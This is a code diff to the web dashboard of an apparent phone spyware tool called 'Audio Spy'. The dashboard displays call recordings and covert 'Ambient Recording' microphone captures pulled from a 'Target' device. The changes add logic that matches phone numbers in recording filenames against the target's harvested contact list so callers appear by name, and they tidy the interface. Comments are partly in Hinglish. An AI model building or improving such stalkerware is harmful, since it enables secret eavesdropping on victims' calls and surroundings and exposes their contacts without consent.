@@ -11,14 +11,13 @@
     <script src="/socket.io/socket.io.js"></script>
 
     <style>
-        /* ... (CSS same as before, no changes needed) ... */
         :root {
             --bg-dark: #050509;
             --card-bg: rgba(22, 27, 34, 0.8);
             --border: rgba(255, 255, 255, 0.1);
             --accent-red: #ff3b30;
             --accent-blue: #0a84ff;
-            --accent-green: #30d158;
+            --accent-green: #30d158; /* Pure Green */
             --text-main: #ffffff;
             --text-muted: #8b949e;
             --glass: blur(12px);
@@ -44,37 +43,41 @@
 
         .title { font-size: 1.2rem; font-weight: 600; letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; }
 
+        /* --- UPDATED: Green Live Badge --- */
         .live-badge {
-            font-size: 0.7rem; background: rgba(255, 59, 48, 0.15); color: var(--accent-red);
-            padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(255, 59, 48, 0.3);
+            font-size: 0.7rem; 
+            background: rgba(48, 209, 88, 0.15); /* Green BG */
+            color: var(--accent-green);          /* Green Text */
+            padding: 4px 10px; border-radius: 20px; 
+            border: 1px solid rgba(48, 209, 88, 0.3);
             display: flex; align-items: center; gap: 6px;
         }
 
         .dot {
-            width: 6px; height: 6px; background: var(--accent-red); border-radius: 50%;
+            width: 6px; height: 6px; 
+            background: var(--accent-green); /* Green Dot */
+            border-radius: 50%;
             animation: pulse 1.5s infinite;
         }
 
         @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.7); }
-            70% { box-shadow: 0 0 0 6px rgba(255, 59, 48, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); }
+            0% { box-shadow: 0 0 0 0 rgba(48, 209, 88, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(48, 209, 88, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(48, 209, 88, 0); }
         }
 
+        /* Target ID Removed visually */
         .device-info-bar {
-            background: rgba(10, 132, 255, 0.1); border: 1px solid rgba(10, 132, 255, 0.3);
-            padding: 10px 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center;
-        }
-
-        .device-id-display {
-            font-family: monospace; color: var(--accent-blue); font-size: 1rem; font-weight: 600;
+            display: flex; justify-content: flex-end; /* Right align button */
+            padding: 0 5px;
         }
 
         .logout-btn {
-            background: transparent; border: 1px solid var(--border); color: var(--text-muted);
-            padding: 5px 10px; border-radius: 5px; font-size: 0.75rem; cursor: pointer;
+            background: rgba(255, 59, 48, 0.1); border: 1px solid rgba(255, 59, 48, 0.3); color: var(--accent-red);
+            padding: 6px 12px; border-radius: 5px; font-size: 0.75rem; cursor: pointer;
+            font-weight: 600;
         }
-        .logout-btn:hover { background: rgba(255,255,255,0.1); color: white; }
+        .logout-btn:hover { background: rgba(255, 59, 48, 0.2); }
 
         .filters {
             display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;
@@ -113,7 +116,7 @@
         .call { color: #0a84ff; background: rgba(10, 132, 255, 0.1); }
         .mic { color: #ff3b30; background: rgba(255, 59, 48, 0.1); }
 
-        .details h4 { margin: 0; font-size: 0.95rem; font-weight: 500; }
+        .details h4 { margin: 0; font-size: 0.95rem; font-weight: 500; color: #fff; }
         .details span { font-size: 0.75rem; color: var(--text-muted); }
 
         audio {
@@ -142,16 +145,12 @@
                 <i class="fa-solid fa-user-secret"></i> Audio Spy
             </div>
             <div class="live-badge">
-                <div class="dot"></div> LIVE
+                <div class="dot"></div> ONLINE
             </div>
         </div>
 
         <div class="device-info-bar">
-            <div style="display:flex; align-items:center; gap: 8px;">
-                <i class="fa-solid fa-mobile-screen" style="color:var(--text-muted)"></i>
-                <span id="displayDeviceId" class="device-id-display">Target Connected</span>
-            </div>
-            <button class="logout-btn" onclick="logout()">CHANGE</button>
+            <button class="logout-btn" onclick="logout()">DISCONNECT</button>
         </div>
 
         <div class="filters">
@@ -164,7 +163,7 @@
     </div>
 
     <div class="container" id="recordingsList">
-        <div class="status-msg">Verifying Target...</div>
+        <div class="status-msg">Fetching Audio Logs...</div>
     </div>
 
     <script>
@@ -172,7 +171,7 @@
         let allRecordings = [];
         let currentFilter = 'All';
         let currentDeviceId = '';
-        let localContacts = []; // Store contacts here
+        let localContacts = []; 
 
         window.onload = () => {
             const savedID = localStorage.getItem('spy_device_id');
@@ -183,10 +182,8 @@
             }
 
             currentDeviceId = savedID;
-            // CHANGED: Yahan ID display update karna band kar diya taki ID show na ho
-            // document.getElementById('displayDeviceId').innerText = ... (Removed)
 
-            // 1. Load Contacts from LocalStorage
+            // 1. Contacts Load (Zaroori hai Name match karne ke liye)
             loadLocalContacts();
 
             // 2. Fetch Audio
@@ -194,54 +191,72 @@
             joinSocketRoom(currentDeviceId);
         };
 
-        // --- NEW: Contacts Loading Logic ---
+        // --- CONTACTS LOADING ---
         function loadLocalContacts() {
-            // Contacts page wala key use kar rahe hain
             const key = `contacts_${currentDeviceId}`;
             const saved = localStorage.getItem(key);
             if (saved) {
                 try {
                     localContacts = JSON.parse(saved);
-                    console.log("Contacts Loaded:", localContacts.length);
-                } catch (e) {
-                    console.error("Error parsing contacts", e);
-                }
+                    console.log("Contacts Loaded for Matching:", localContacts.length);
+                } catch (e) { console.error("Error parsing contacts", e); }
+            } else {
+                console.warn("No contacts found in LocalStorage. Names might not show.");
             }
         }
 
-        // --- NEW: Number to Name Matcher ---
-        function matchNameFromNumber(filenameString) {
-            // Filename me se number dhoondo (kam se kam 5 digit)
-            // Example filename: "Call_9876543210_123456.mp3"
-            const numberMatch = filenameString.match(/(\d{6,})/); 
+        // --- NAME MATCHING LOGIC (UPDATED) ---
+        function getDisplayName(filename) {
+            if(!filename) return "Unknown";
+
+            // 1. Agar filename me number hai (e.g. Call_9876543210.mp3)
+            // Hum 5 digit se lamba koi bhi number dhundenge
+            const numberMatch = filename.match(/(\d{6,})/); 
             
             if (numberMatch) {
-                let foundNumber = numberMatch[0];
-                
-                // Local contacts me search karo
-                // (Thoda loose search: agar file number, contact number me exist karta hai ya vice versa)
+                let foundNumber = numberMatch[0]; // Ye wo number hai jo file name me mila
+
+                // Local Contacts me dhundo
                 const contact = localContacts.find(c => {
                     if (!c.number && !c.phone) return false;
-                    let cNum = (c.number || c.phone).replace(/\D/g, ''); // Sirf digits rakho
-                    return cNum.includes(foundNumber) || foundNumber.includes(cNum);
+                    
+                    // Contact list wale number ko clean karo (sirf digits)
+                    let cNum = (c.number || c.phone).replace(/\D/g, '');
+                    // Filename wale number ko clean karo
+                    let fileNum = foundNumber.replace(/\D/g, '');
+
+                    // Check karo agar wo match hote hain (last 10 digits compare karna safe hai)
+                    return cNum.includes(fileNum) || fileNum.includes(cNum);
                 });
 
                 if (contact && contact.name) {
-                    return contact.name; // Naam mil gaya!
+                    return `📞 ${contact.name}`; // Naam mil gaya!
                 }
-                return foundNumber; // Naam nahi mila to Number dikhao
+                
+                // Agar naam nahi mila, to saaf Number dikhao
+                return `Unknown (${foundNumber})`;
             }
-            return null; // Number hi nahi mila file name me
+            
+            // 2. Agar number nahi mila, to App ka naam dikhao
+            const app = detectApp(filename);
+            if (app === 'WhatsApp') return 'WhatsApp Call';
+            if (app === 'Instagram') return 'Instagram Call';
+            if (app === 'Mic') return 'Ambient Recording';
+            
+            return 'Unknown Recording';
         }
 
         socket.on('new-audio', (data) => {
             if(currentDeviceId && data.device_id !== currentDeviceId) return;
-
+            
             console.log("🔊 New Audio Received:", data);
+            
+            // Name process karo
+            const displayName = getDisplayName(data.name || data.filename);
 
             const processed = {
                 app: detectApp(data.name),
-                displayName: getDisplayName(data.name), // Name logic yahan lagaya
+                displayName: displayName, 
                 date: new Date().toLocaleDateString(),
                 time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                 url: data.url,
@@ -285,14 +300,13 @@
             );
 
             if(filtered.length === 0) {
-                container.innerHTML = `<div class="status-msg">No audio clips found for this filter.</div>`;
+                container.innerHTML = `<div class="status-msg">No audio clips found.</div>`;
                 return;
             }
 
             filtered.forEach(rec => {
                 const iconInfo = getIconInfo(rec.app);
                 
-                // CHANGED: Title ab 'displayName' se aayega
                 const html = `
                     <div class="card">
                         <div class="card-top">
@@ -330,32 +344,12 @@
             
             return {
                 app: detectApp(fileName),
-                displayName: getDisplayName(fileName), // Name logic
+                displayName: getDisplayName(fileName), // Yahan naam nikalega
                 date: d.toLocaleDateString(),
                 time: d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                 url: file.secure_url,
                 id: currentDeviceId
             };
-        }
-
-        // --- Helper to decide what name to show ---
-        function getDisplayName(filename) {
-            const app = detectApp(filename);
-            
-            // Step 1: Try to find name from contact list using filename number
-            const matchedName = matchNameFromNumber(filename);
-            
-            if (matchedName) {
-                // Agar contact match ho gaya
-                return matchedName; 
-            }
-            
-            // Step 2: Agar contact match nahi hua, to generic naam do
-            if (app === 'WhatsApp') return 'WhatsApp Call';
-            if (app === 'Instagram') return 'Instagram Call';
-            if (app === 'Mic') return 'Ambient Recording';
-            
-            return 'Unknown Number';
         }
 
         function detectApp(name) {
@@ -381,7 +375,6 @@
             btnElement.classList.add('active');
             render();
         }
-
     </script>
 </body>
 </html>
